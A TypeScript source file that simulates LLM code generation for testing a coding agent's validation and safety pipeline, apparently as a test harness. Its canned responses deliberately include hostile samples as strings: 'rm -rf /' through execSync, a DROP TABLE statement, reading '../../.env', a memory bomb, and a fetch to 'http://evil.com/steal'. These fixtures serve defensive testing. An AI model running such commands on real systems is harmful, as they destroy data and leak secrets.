// Code generation simulation for coding agents.
// In production, this would call a language model; here we simulate
// the interface and demonstrate validation requirements.

import type {
  CodeGenRequest,
  CodeGenResult,
  CodeConstraints,
  ValidationError,
} from './types.ts';

/**
 * CodeGenerator simulates LLM code generation with validation.
 *
 * In production:
 * - Calls frontier model with code-optimized prompt
 * - Parses code blocks from response
 * - Validates syntax before returning
 *
 * Here we simulate responses for testing the validation pipeline.
 */
export class CodeGenerator {
  private simulatedResponses: Map<string, string>;

  constructor() {
    this.simulatedResponses = new Map();
    this.loadSimulatedResponses();
  }

  /**
   * Generate code from a prompt.
   */
  async generate(request: CodeGenRequest): Promise<CodeGenResult> {
    // Simulate model latency
    await this.delay(10);

    // Find matching simulated response
    const code = this.findResponse(request.prompt, request.language);

    // Apply constraints
    const constrained = this.applyConstraints(code, request.constraints);

    // Validate syntax
    const validationErrors = this.validateSyntax(
      constrained,
      request.language
    );

    return {
      code: constrained,
      language: request.language,
      valid: validationErrors.length === 0,
      validationErrors,
      safetyViolations: [], // Safety checks done separately
    };
  }

  /**
   * Register a simulated response for testing.
   */
  registerResponse(pattern: string, code: string): void {
    this.simulatedResponses.set(pattern.toLowerCase(), code);
  }

  /**
   * Find a simulated response matching the prompt.
   */
  private findResponse(prompt: string, language: string): string {
    const normalized = prompt.toLowerCase();

    // Check for exact match first
    if (this.simulatedResponses.has(normalized)) {
      return this.simulatedResponses.get(normalized) as string;
    }

    // Check for partial matches
    for (const [pattern, code] of this.simulatedResponses) {
      if (normalized.includes(pattern)) {
        return code;
      }
    }

    // Default fallback
    return this.getDefaultResponse(language);
  }

  /**
   * Apply constraints to generated code.
   */
  private applyConstraints(
    code: string,
    constraints?: CodeConstraints
  ): string {
    if (!constraints) return code;

    let result = code;

    // Apply line limit
    if (constraints.maxLines) {
      const lines = result.split('\n');
      if (lines.length > constraints.maxLines) {
        result = lines.slice(0, constraints.maxLines).join('\n');
      }
    }

    return result;
  }

  /**
   * Validate syntax of generated code.
   * Returns empty array if valid, error details if not.
   */
  private validateSyntax(
    code: string,
    language: string
  ): ValidationError[] {
    const errors: ValidationError[] = [];

    if (language === 'typescript' || language === 'javascript') {
      errors.push(...this.validateJavaScriptSyntax(code));
    } else if (language === 'python') {
      errors.push(...this.validatePythonSyntax(code));
    }

    return errors;
  }

  /**
   * Basic JavaScript/TypeScript syntax validation.
   * In production, use a proper parser.
   */
  private validateJavaScriptSyntax(code: string): ValidationError[] {
    const errors: ValidationError[] = [];
    const lines = code.split('\n');

    let braceCount = 0;
    let parenCount = 0;
    let bracketCount = 0;
    let inString = false;
    let stringChar = '';

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];

      for (let j = 0; j < line.length; j++) {
        const char = line[j];
        const prev = j > 0 ? line[j - 1] : '';

        // Track string state
        if ((char === '"' || char === "'" || char === '`') && prev !== '\\') {
          if (!inString) {
            inString = true;
            stringChar = char;
          } else if (char === stringChar) {
            inString = false;
          }
          continue;
        }

        if (inString) continue;

        // Count brackets
        if (char === '{') braceCount++;
        if (char === '}') braceCount--;
        if (char === '(') parenCount++;
        if (char === ')') parenCount--;
        if (char === '[') bracketCount++;
        if (char === ']') bracketCount--;

        // Check for negative counts (closing before opening)
        if (braceCount < 0) {
          errors.push({
            line: i + 1,
            column: j + 1,
            message: 'Unexpected closing brace',
            severity: 'error',
          });
          braceCount = 0;
        }
        if (parenCount < 0) {
          errors.push({
            line: i + 1,
            column: j + 1,
            message: 'Unexpected closing parenthesis',
            severity: 'error',
          });
          parenCount = 0;
        }
        if (bracketCount < 0) {
          errors.push({
            line: i + 1,
            column: j + 1,
            message: 'Unexpected closing bracket',
            severity: 'error',
          });
          bracketCount = 0;
        }
      }
    }

    // Check for unclosed brackets at end
    if (braceCount !== 0) {
      errors.push({
        line: lines.length,
        column: 1,
        message: `Unclosed brace: ${braceCount} remaining`,
        severity: 'error',
      });
    }
    if (parenCount !== 0) {
      errors.push({
        line: lines.length,
        column: 1,
        message: `Unclosed parenthesis: ${parenCount} remaining`,
        severity: 'error',
      });
    }
    if (bracketCount !== 0) {
      errors.push({
        line: lines.length,
        column: 1,
        message: `Unclosed bracket: ${bracketCount} remaining`,
        severity: 'error',
      });
    }

    return errors;
  }

  /**
   * Basic Python syntax validation.
   */
  private validatePythonSyntax(code: string): ValidationError[] {
    const errors: ValidationError[] = [];
    const lines = code.split('\n');

    let expectedIndent = 0;
    const indentStack: number[] = [0];

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const trimmed = line.trim();

      // Skip empty lines and comments
      if (trimmed === '' || trimmed.startsWith('#')) continue;

      // Count leading spaces
      const indent = line.length - line.trimStart().length;

      // Check for tabs (inconsistent indentation)
      if (line.includes('\t')) {
        errors.push({
          line: i + 1,
          column: line.indexOf('\t') + 1,
          message: 'Mixed tabs and spaces',
          severity: 'warning',
        });
      }

      // Check if line ends with colon (block starter)
      if (trimmed.endsWith(':')) {
        indentStack.push(indent);
        expectedIndent = indent + 4; // Expect more indentation
      } else {
        // Validate indentation
        while (indentStack.length > 1 && indent < indentStack[indentStack.length - 1]) {
          indentStack.pop();
        }
      }
    }

    return errors;
  }

  /**
   * Get default response for unknown prompts.
   */
  private getDefaultResponse(language: string): string {
    if (language === 'python') {
      return 'def main():\n    pass\n';
    }
    return 'function main() {\n  // TODO\n}\n';
  }

  /**
   * Load simulated responses for testing.
   */
  private loadSimulatedResponses(): void {
    // Valid TypeScript
    this.simulatedResponses.set(
      'hello world',
      'function greet(name: string): string {\n  return `Hello, ${name}!`;\n}\n'
    );

    // Valid Python
    this.simulatedResponses.set(
      'fibonacci',
      'def fibonacci(n: int) -> int:\n    if n <= 1:\n        return n\n    return fibonacci(n - 1) + fibonacci(n - 2)\n'
    );

    // Invalid syntax (unclosed brace)
    this.simulatedResponses.set(
      'invalid syntax',
      'function broken() {\n  const x = 1;\n  // missing closing brace\n'
    );

    // Destructive command
    this.simulatedResponses.set(
      'delete files',
      'import { execSync } from "child_process";\nexecSync("rm -rf /");\n'
    );

    // SQL injection
    this.simulatedResponses.set(
      'drop table',
      'const query = `DROP TABLE users; --`;\ndb.execute(query);\n'
    );

    // Path escape
    this.simulatedResponses.set(
      'read secrets',
      'import fs from "fs";\nconst data = fs.readFileSync("../../.env");\n'
    );

    // Infinite loop
    this.simulatedResponses.set(
      'infinite loop',
      'while (true) {\n  console.log("forever");\n}\n'
    );

    // Resource exhaustion
    this.simulatedResponses.set(
      'memory bomb',
      'const arr = [];\nwhile (true) {\n  arr.push(new Array(1000000));\n}\n'
    );

    // Network access
    this.simulatedResponses.set(
      'fetch data',
      'import fetch from "node-fetch";\nawait fetch("http://evil.com/steal");\n'
    );

    // Valid but complex
    this.simulatedResponses.set(
      'sort array',
      'function quickSort<T>(arr: T[]): T[] {\n  if (arr.length <= 1) return arr;\n  const pivot = arr[0];\n  const left = arr.slice(1).filter(x => x < pivot);\n  const right = arr.slice(1).filter(x => x >= pivot);\n  return [...quickSort(left), pivot, ...quickSort(right)];\n}\n'
    );
  }

  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}

/**
 * Parse code blocks from model response.
 * Handles markdown fenced code blocks.
 */
export function parseCodeBlocks(
  response: string
): Array<{ language: string; code: string }> {
  const blocks: Array<{ language: string; code: string }> = [];
  const regex = /```(\w*)\n([\s\S]*?)```/g;
  let match;

  while ((match = regex.exec(response)) !== null) {
    blocks.push({
      language: match[1] || 'text',
      code: match[2].trim(),
    });
  }

  return blocks;
}

/**
 * Estimate token count for code.
 * Rough approximation: 1 token per 4 characters.
 */
export function estimateTokens(code: string): number {
  return Math.ceil(code.length / 4);
}
